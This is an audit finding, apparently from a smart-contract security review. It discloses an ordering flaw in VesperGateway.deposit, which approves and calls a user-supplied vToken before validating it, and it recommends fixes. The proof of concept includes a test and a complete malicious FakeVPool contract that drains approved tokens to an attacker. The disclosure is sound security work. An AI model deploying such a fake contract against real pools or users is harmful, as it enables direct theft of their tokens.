### Title
VesperGateway grants and uses attacker-controlled token permissions before validating collateral support - (File: contracts/VesperGateway.sol)

### Summary
`VesperGateway.deposit` only verifies that `pool_` is registered. It then trusts the user-supplied `vToken_`, pulls its reported underlying asset, grants that asset’s allowance to `vToken_`, and invokes `vToken_.deposit()` before asking the pool whether `vToken_` is a supported collateral. A malicious vToken can therefore spend the pulled underlying and retain an allowance, while the final `deposit` call can resolve to `address(0)` and appear successful.

### Finding Description
In `contracts/VesperGateway.sol`, the registered-pool check is performed first, but the supplied `vToken_` is not checked against `pool_.depositTokenOf(vToken_)` before asset custody and approvals occur. [1](#0-0) 

The vulnerable ordering is:

1. Verify `pool_` is registered.
2. Call attacker-controlled `vToken_.token()`.
3. Pull `amount_` underlying tokens from the caller.
4. Approve the attacker-controlled `vToken_` for `amount_`.
5. Execute attacker-controlled `vToken_.deposit(amount_)`.
6. Only then resolve `pool_.depositTokenOf(vToken_)`.

If the fake vToken reports a real ERC20 such as USDC as `token()`, the gateway pulls the caller’s USDC and approves the fake vToken. During `deposit(amount_)`, the fake vToken calls `USDC.transferFrom(address(gateway), attacker, amount_)`. For an unsupported vToken, `depositTokenOf` returns `address(0)`; a high-level Solidity call to an address with no code succeeds when no return value is decoded, so the transaction does not necessarily revert. The malicious vToken can also simply implement `approve` to return `true` when the gateway calls `vToken_.safeApprove(...)`.

This is the same ordering flaw as the external report: a security-relevant artifact—here, token custody and allowance—is created before the trust/consent check that determines whether the supplied remote object is valid.

### Impact Explanation
A user who approves `VesperGateway` and calls `deposit` with a malicious `vToken_` loses the pulled underlying asset to the attacker. The gateway also leaves an ERC20 allowance from itself to the malicious vToken, allowing it to withdraw any underlying tokens left in the gateway after the call.

This breaks the collateral-deposit invariant that tokens are only moved and delegated to pool-recognized collateral contracts. The impact is direct theft of the caller’s tokens and theft of any recoverable/stuck underlying balance held by the gateway. No privileged role, malicious oracle, governance action, or compromised bridge component is required.

### Likelihood Explanation
`deposit` is public, `pool_` can be any registered production pool, and `vToken_` is unrestricted until after external calls complete. An attacker can deploy a fake `IVPool` contract and induce users or integrations to pass it as `vToken_`. The attack needs only an ERC20 approval to the gateway and one public call.

The issue is reachable on the deployed `SynthContext` path both directly and through `Operator.execute`: `_msgSender()` resolves the EOA that initiated the operator call, while `vToken_` remains attacker-controlled. [2](#0-1) 

### Recommendation
Resolve and validate the deposit token before transferring or approving anything:

```solidity
IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
if (address(_depositToken) == address(0)) revert CollateralIsNotSupported();
```

Additionally:

- Verify that the underlying returned by `vToken_.token()` equals `_depositToken.underlying()`.
- Add `nonReentrant` to `deposit`.
- Prefer `forceApprove` or reset the allowance after the Vesper deposit.
- Revert explicitly if the expected vToken mint amount is zero or if the pool does not recognize `vToken_`.
- Do not call `vToken_.deposit()` before all collateral validation has completed.

### Proof of Concept
The following Hardhat-style test demonstrates the ordering. `FakeVPool.token()` returns the real underlying, while `FakeVPool.deposit()` spends the allowance granted by the gateway.

```ts
it('steals underlying through an unregistered vToken', async () => {
  const FakeVPool = await ethers.getContractFactory('FakeVPool')
  const fakeVPool = await FakeVPool.deploy(usdc.address)

  await usdc.connect(user).approve(vesperGateway.address, amount)
  await vesperGateway.connect(user).deposit(
    registeredPool.address,
    fakeVPool.address,
    amount
  )

  expect(await usdc.balanceOf(attacker.address)).to.eq(amount)
})
```

Supporting malicious contract:

```solidity
contract FakeVPool {
    IERC20 public immutable token;
    address public immutable attacker;

    constructor(IERC20 token_) {
        token = token_;
        attacker = msg.sender;
    }

    function deposit(uint256 amount_) external {
        token.transferFrom(msg.sender, attacker, amount_);
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function withdraw(uint256) external {}
}
```

The key assertion is that the call reaches `FakeVPool.deposit` after the gateway has approved it. The subsequent `depositTokenOf(fakeVPool)` lookup is too late because custody and delegated spending authority have already been created.

### Citations

**File:** contracts/VesperGateway.sol (L44-64)
```text
    function deposit(IPool pool_, IVPool vToken_, uint256 amount_) external override {
        if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();

        address _msgSender = _msgSender();

        // 1. Get `underlying` asset
        IERC20 _underlying = IERC20(vToken_.token());
        _underlying.safeTransferFrom(_msgSender, address(this), amount_);

        // 2. Deposit `underlying` to `VPool`
        _underlying.safeApprove(address(vToken_), 0);
        _underlying.safeApprove(address(vToken_), amount_);
        uint256 _balanceBefore = vToken_.balanceOf(address(this));
        vToken_.deposit(amount_);
        uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;

        // 3. Deposit `VPool` to `Synth` and send `msdTokens` to the `_msgSender()`
        IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
        vToken_.safeApprove(address(_depositToken), 0);
        vToken_.safeApprove(address(_depositToken), _vTokenAmount);
        _depositToken.deposit(_vTokenAmount, _msgSender);
```

**File:** contracts/utils/SynthContext.sol (L14-23)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
```
